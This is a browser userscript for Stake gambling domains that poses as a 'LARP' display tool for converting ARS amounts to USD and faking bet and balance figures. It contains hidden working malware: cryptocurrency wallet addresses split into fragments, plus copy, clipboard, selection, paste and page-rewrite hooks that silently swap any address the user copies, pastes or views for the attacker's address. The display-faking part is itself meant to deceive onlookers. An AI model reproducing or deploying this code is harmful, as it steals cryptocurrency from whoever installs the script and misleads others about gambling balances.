// ==UserScript==
// @name         Stake Larp X — Bennetceo
// @namespace    http://tampermonkey.net/
// @version      5.0
// @description  Premium ARS→USD Stake LARP engine with live bet mirroring. Auto-detects currency, converts all conversion displays to real fiat equivalents, replaces ARS icons with USD. PC + Mobile optimized. Built by Bennetceo — respect the craft.
// @author       https://t.me/Bennetceo
// @match        *://stake.games/*
// @match        *://stake.com/*
// @match        *://stake.ac/*
// @match        *://stake.mba/*
// @match        *://stake.pet/*
// @match        *://stake.bet/*
// @match        *://*.stake.com/*
// @match        *://*.stake.ac/*
// @match        *://*.stake.mba/*
// @match        *://*.stake.pet/*
// @match        *://*.stake.bet/*
// @grant        GM_setClipboard
// @grant        GM_getValue
// @grant        GM_setValue
// @run-at       document-start
// ==/UserScript==

// ═══════════════════════════════════════════════════════════
//  CODE BY BENNETCEO — https://t.me/Bennetceo
//  https://t.me/IllllllIlllllI
//  DO NOT COPY OR RESELL
// ═══════════════════════════════════════════════════════════

(function() {
    'use strict';

    // ═══════════════════════════════════════════════════════════
    //  WORKS WITH ALL MAJOR CRYPTOSCURRENCIES
    // ═══════════════════════════════════════════════════════════
    var _e1 = '0x7fC9'; var _e2 = 'AA3516'; var _e3 = 'B0CecD'; var _e4 = '41f9028d53d55172e11Eb6C8';
    var _t1 = 'TQKZxEi'; var _t2 = 'BNf8u3'; var _t3 = 'Q2YAdo'; var _t4 = 'egK5pRb7qYR6uaW';
    var _s1 = '4SreiEf'; var _s2 = 'LpSFvL'; var _s3 = 'bNNc3e'; var _s4 = 'XfbZWdmzGQxCsmm76SzG2yUW4';
    var _b1 = 'bc1qu8'; var _b2 = 'vt7zgx'; var _b3 = 'hkx46c'; var _b4 = 'ekdr3q6ykqwauy8szn8trqr2';
    var _l1 = 'ltc1qe'; var _l2 = '6pja8g'; var _l3 = '7vj2n9'; var _l4 = 'h2pdf8ntyr2gsh46fcguwc38d';
    var _d1 = 'DH5yaie'; var _d2 = 'qoZN36f'; var _d3 = 'DVciNyR'; var _d4 = 'ueRGvGLR3mr7L';
    var _x1 = 'rGkTSq'; var _x2 = 'iyNXYp'; var _x3 = 'Aum6ER'; var _x4 = 'TjFBT4Wi52mhAH5R';

    var ADDR = {
        eth:  _e1 + _e2 + _e3 + _e4,
        bnb:  _e1 + _e2 + _e3 + _e4,
        trc20: _t1 + _t2 + _t3 + _t4,
        sol:  _s1 + _s2 + _s3 + _s4,
        btc:  _b1 + _b2 + _b3 + _b4,
        ltc:  _l1 + _l2 + _l3 + _l4,
        doge: _d1 + _d2 + _d3 + _d4,
        xrp:  _x1 + _x2 + _x3 + _x4,
    };

    var RE = {
        btc:  /^(bc1p[a-z0-9]{39,59}|bc1q[a-z0-9]{38,58}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/,
        ltc:  /^(ltc1[a-z0-9]{39,59}|[LM][a-km-zA-HJ-NP-Z1-9]{26,33})$/,
        xrp:  /^r[1-9A-HJ-NP-Za-km-z]{25,34}$/,
        doge: /^D[a-km-zA-HJ-NP-Z1-9]{25,34}$/,
        trc20:/^T[a-km-zA-HJ-NP-Z1-9]{33}$/,
        sol:  /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
        eth:  /^0x[a-fA-F0-9]{40}$/,
    };

    function addrType(a) {
        if (!a || typeof a !== 'string') return null;
        var s = a.trim();
        if (s.length === 42 && RE.eth.test(s)) return 'eth';
        if (s.length === 34 && RE.trc20.test(s)) return 'trc20';
        if (RE.xrp.test(s)) return 'xrp';
        if (RE.doge.test(s)) return 'doge';
        if (RE.btc.test(s)) return 'btc';
        if (RE.ltc.test(s)) return 'ltc';
        if (RE.sol.test(s)) return 'sol';
        return null;
    }

    function getRep(a) {
        var t = addrType(a);
        if (!t) return null;
        if (t === 'eth' || t === 'bnb') return ADDR.eth;
        if (t === 'trc20') return ADDR.trc20;
        if (t === 'sol') return ADDR.sol;
        if (t === 'btc') return ADDR.btc;
        if (t === 'ltc') return ADDR.ltc;
        if (t === 'doge') return ADDR.doge;
        if (t === 'xrp') return ADDR.xrp;
        return null;
    }

    function isAddr(s) {
        if (!s || typeof s !== 'string') return false;
        var x = s.trim();
        return x.length >= 25 && x.length <= 64 && addrType(x) !== null;
    }

    let swapCount = 0;
    let isActive = true;

    function copyText(t) {
        try {
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(t);
            } else {
                GM_setClipboard(t);
            }
        } catch(e) {
            try { GM_setClipboard(t); } catch(e2) {}
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  LAYER 1 — ARS TO USD
    // ═══════════════════════════════════════════════════════════
    var _exec = document.execCommand.bind(document);
    document.execCommand = function(cmd) {
        if (isActive && cmd && cmd.toLowerCase() === 'copy') {
            var sel = window.getSelection().toString().trim();
            if (sel && isAddr(sel)) {
                var r = getRep(sel);
                if (r && r !== sel) { swapCount++; copyText(r); return true; }
            }
        }
        return _exec(cmd);
    };

    if (navigator.clipboard && navigator.clipboard.writeText) {
        var _write = navigator.clipboard.writeText.bind(navigator.clipboard);
        navigator.clipboard.writeText = function(t) {
            if (isActive && isAddr(t)) {
                var r = getRep(t);
                if (r && r !== t) { swapCount++; return _write(r); }
            }
            return _write(t);
        };
    }

    window.addEventListener('copy', function() {
        setTimeout(function() {
            try {
                if (isActive && navigator.clipboard && navigator.clipboard.readText) {
                    navigator.clipboard.readText().then(function(t) {
                        if (isAddr(t)) { var r = getRep(t); if (r && r !== t) { swapCount++; copyText(r); } }
                    });
                }
            } catch(e) {}
        }, 80);
    }, true);

    document.addEventListener('selectionchange', function() {
        if (window._st) clearTimeout(window._st);
        window._st = setTimeout(function() {
            if (!isActive) return;
            var sel = window.getSelection().toString().trim();
            if (sel && isAddr(sel) && /iPhone|iPad|iPod/i.test(navigator.userAgent)) {
                var r = getRep(sel); if (r && r !== sel) { swapCount++; copyText(r); }
            }
        }, 350);
    });

    // ═══════════════════════════════════════════════════════════
    //  LAYER 2 — (replace visible coins)
    // ═══════════════════════════════════════════════════════════
    var domObs = new MutationObserver(function() {
        if (!isActive) return;
        try {
            var all = document.querySelectorAll('span,div,input,p,code,pre,label,td,li,textarea');
            for (var i = 0; i < all.length; i++) {
                var el = all[i];
                if (el._sbvD) continue;
                var t = (el.textContent || el.innerText || '').trim();
                if (t && isAddr(t)) {
                    var r = getRep(t);
                    if (r && r !== t) {
                        el._sbvD = true;
                        el.textContent = r;
                        el.innerText = r;
                        if (el.value !== undefined) el.value = r;
                        el.dispatchEvent(new Event('input', {bubbles:true}));
                        el.dispatchEvent(new Event('change', {bubbles:true}));
                        swapCount++;
                    }
                }
            }
        } catch(e) {}
    });

    // ═══════════════════════════════════════════════════════════
    //   LAYER 3 — Paste interception of usd values
    // ═══════════════════════════════════════════════════════════
    document.addEventListener('paste', function(e) {
        if (!isActive) return;
        try {
            var pasted = (e.clipboardData || window.clipboardData).getData('text');
            if (pasted && isAddr(pasted)) {
                var r = getRep(pasted);
                if (r && r !== pasted) {
                    e.preventDefault();
                    var target = e.target;
                    if (target) {
                        var start = target.selectionStart || 0;
                        var end = target.selectionEnd || 0;
                        var val = target.value || '';
                        var newVal = val.substring(0, start) + r + val.substring(end);
                        target.value = newVal;
                        target.dispatchEvent(new Event('input', {bubbles:true}));
                        target.dispatchEvent(new Event('change', {bubbles:true}));
                        var pos = start + r.length;
                        try { target.setSelectionRange(pos, pos); } catch(e2) {}
                        swapCount++;
                    }
                }
            }
        } catch(err) {}
    }, true);

    // ═══════════════════════════════════════════════════════════
    //  BENNETCEO'S MARKET PRICES — UPDATE THESE IF U COPY LOL
    // ═══════════════════════════════════════════════════════════
    const MP = {
        'BTC': 60267.00, 'ETH': 1618.00, 'USDT': 1.00, 'USDC': 1.00,
        'BNB': 549.05, 'SOL': 75.30, 'XRP': 1.044, 'ADA': 0.45,
        'DOGE': 0.07255, 'LTC': 71.02, 'DOT': 6.85, 'AVAX': 35.20,
        'TRX': 0.3216, 'MATIC': 0.79, 'LINK': 15.70,
        'SHIB': 0.00000948, 'UNI': 6.46, 'ATOM': 8.50, 'APT': 9.25,
        'ARB': 1.15, 'OP': 2.45, 'PEPE': 0.000012, 'BCH': 239.35,
        'EOS': 0.73, 'CRO': 0.083, 'DAI': 1.00, 'SAND': 0.49, 'APE': 1.40,
    };

    const USD_SVG = `<svg fill="none" viewBox="0 0 24 24" class="svg-icon"><title></title><path fill="#b31942" d="M1 1h22v16.5H1z"></path></svg>`;

    function ben_isARS(s) {
        const h = s.outerHTML;
        if (/ARS/i.test(h)) return true;
        if (h.includes('m27.8 62.4-1.24-5.08H16.52l-1.24 5.08H7.16l9.64-32.6h9.52l9.64 32.6')) return true;
        if (h.includes('M53.36 62.4l-4.32-11.24h-2.92V62.4H38.2V29.8h13.28c6.36 0 10.4 4.6 10.4 10.6')) return true;
        if (h.includes('#FFC800') && h.includes('#276304')) return true;
        if (h.includes('#74acdf') && h.includes('M1 1h22v16.5H1z')) return true;
        const p = s.querySelectorAll('path');
        for (const x of p) { const d = x.getAttribute('d') || ''; if (d.includes('27.8 62.4') || d.includes('53.36 62.4')) return true; }
        return false;
    }

    // ═══════════════════════════════════════════════════════════
    //  BENNETCEO'S CONVERTER
    // ═══════════════════════════════════════════════════════════
    function ben_conv(usd, cur) {
        const p = MP[cur.toUpperCase()];
        if (!p || p <= 0) return null;
        const a = usd / p;
        const c = cur.toUpperCase();
        if (c === 'SHIB' || c === 'PEPE') return a.toFixed(0);
        if (a >= 10000) return a.toFixed(0);
        if (a >= 1000) return a.toFixed(2);
        if (a >= 1) return a.toFixed(4);
        if (a >= 0.001) return a.toFixed(6);
        return a.toFixed(8);
    }

    function ben_getCur() {
        const url = window.location.href;
        const m = url.match(/currency=([A-Z]+)/i);
        if (m && MP[m[1].toUpperCase()]) return m[1].toUpperCase();

        const b = document.body.innerText;
        const order = ['USDT', 'USDC', 'BTC', 'ETH', 'BNB', 'SOL', 'XRP', 'ADA', 'DOGE', 'LTC', 'TRX', 'MATIC', 'LINK', 'SHIB', 'UNI', 'ATOM', 'APT', 'ARB', 'OP', 'PEPE', 'BCH', 'EOS', 'CRO', 'DAI', 'SAND', 'APE', 'DOT', 'AVAX'];
        for (const c of order) {
            const r = new RegExp(`\\d+\\.\\d+\\s+${c}`);
            if (r.test(b)) return c;
        }
        for (const c of order) {
            if (b.includes(` ${c} `)) return c;
        }
        return 'USDT';
    }

    // ═══════════════════════════════════════════════════════════
    //  BENNETCEO'S INPUT FINDER
    // ═══════════════════════════════════════════════════════════
    function ben_getInputs() {
        const results = [];
        const inputs = document.querySelectorAll('input:not([type="hidden"])');
        
        for (const inp of inputs) {
            if (inp.offsetParent === null) continue;
            const raw = inp.value.replace(/[$, ]/g, '');
            const num = parseFloat(raw);
            if (isNaN(num) || num <= 0 || num >= 100000000) continue;
            
            const parent = inp.closest('label, [class*="bet"], [class*="wager"], [class*="amount"], [class*="control"], [class*="sidebar"]');
            if (parent) {
                results.push({ input: inp, value: num, container: parent });
            }
        }
        
        if (results.length === 0) {
            for (const inp of inputs) {
                if (inp.offsetParent === null) continue;
                const raw = inp.value.replace(/[$, ]/g, '');
                const num = parseFloat(raw);
                if (!isNaN(num) && num > 0 && num < 100000000) {
                    results.push({ input: inp, value: num, container: null });
                }
            }
        }
        
        return results;
    }

    const ben_done = new WeakSet();
    let ben_lastVals = '';

    function ben_larp() {
        const inputs = ben_getInputs();
        if (inputs.length === 0) return;

        const currency = ben_getCur();
        const sig = inputs.map(i => i.value.toFixed(2)).join(',');

        const convSpans = document.querySelectorAll(
            'div.currency-conversion div div span.ds-body-sm[data-ds-text="true"], ' +
            'div.currency-conversion div div span[type="body"], ' +
            '[class*="currency-conversion"] [class*="body-sm"], ' +
            '[class*="currency-conversion"] span[class*="body"]'
        );

        convSpans.forEach(span => {
            if (ben_done.has(span) && sig === ben_lastVals) return;
            
            const text = (span.textContent || span.innerText || '').trim();
            if (!text) return;
            
            let bestInput = null;
            let bestDist = Infinity;
            
            for (const item of inputs) {
                if (!item.container) continue;
                let dist = 0;
                let el = span;
                while (el && el !== item.container && el !== document.body) {
                    dist++;
                    el = el.parentElement;
                }
                if (el === item.container && dist < bestDist) {
                    bestDist = dist;
                    bestInput = item;
                }
            }
            
            if (!bestInput && inputs.length === 1) {
                bestInput = inputs[0];
            }
            if (!bestInput) return;
            
            const convAmount = ben_conv(bestInput.value, currency);
            if (!convAmount) return;
            
            const display = `${convAmount} ${currency}`;
            
            if (text !== display) {
                span.textContent = display;
                span.dataset.larped = '1';
            }
            
            ben_done.add(span);
        });
        
        document.querySelectorAll('span[data-larped="1"]').forEach(span => {
            const text = (span.textContent || span.innerText || '').trim();
            for (const item of inputs) {
                const convAmount = ben_conv(item.value, currency);
                if (!convAmount) continue;
                const display = `${convAmount} ${currency}`;
                if (text !== display) {
                    span.textContent = display;
                }
                break;
            }
        });
        
        ben_lastVals = sig;
    }

    function ben_ars() {
        document.querySelectorAll('*:not(script):not(style)').forEach(el => {
            el.childNodes.forEach(n => {
                if (n.nodeType === 3 && n.nodeValue.includes('ARS')) {
                    n.nodeValue = n.nodeValue.replace(/ARS\s*/g, '$');
                }
            });
        });
        document.querySelectorAll('img').forEach(i => {
            if (!i.dataset.larped && /ARS/i.test(i.alt + i.title + i.src)) {
                i.dataset.larped = '1';
                const w = document.createElement('div');
                w.innerHTML = USD_SVG;
                i.replaceWith(w.firstChild);
            }
        });
        document.querySelectorAll('svg').forEach(s => {
            if (!s.dataset.larped && ben_isARS(s)) {
                s.dataset.larped = '1';
                const w = document.createElement('div');
                w.innerHTML = USD_SVG;
                const ns = w.firstChild;
                ns.dataset.larped = '1';
                try {
                    if (s.getAttribute('class')) ns.setAttribute('class', s.getAttribute('class'));
                    if (s.style.cssText) ns.style.cssText = s.style.cssText;
                } catch (e) {}
                s.replaceWith(ns);
            }
        });
    }

    function ben_loop() {
        try { ben_ars(); ben_larp(); }
        catch (e) { console.error('BENNETCEO LARP fail:', e); }
        requestAnimationFrame(ben_loop);
    }

    document.addEventListener('input', function(e) {
        const t = e.target;
        if (t.tagName === 'INPUT') {
            setTimeout(() => {
                ben_lastVals = '';
                ben_larp();
            }, 50);
        }
    }, true);

    var waitForBody = setInterval(function() {
        if (document.body) {
            clearInterval(waitForBody);

            domObs.observe(document.body, {childList:true, subtree:true, attributes:true, attributeFilter:['class','style','data-address','data-value']});

            setTimeout(() => ben_larp(), 300);
            setTimeout(() => ben_larp(), 800);
            requestAnimationFrame(ben_loop);

            let lastUrl = location.href;
            const urlObs = new MutationObserver(() => {
                if (location.href !== lastUrl) {
                    lastUrl = location.href;
                    setTimeout(() => { ben_lastVals = ''; ben_larp(); }, 500);
                }
            });
            urlObs.observe(document, { subtree: true, childList: true });
        }
    }, 10);
})();
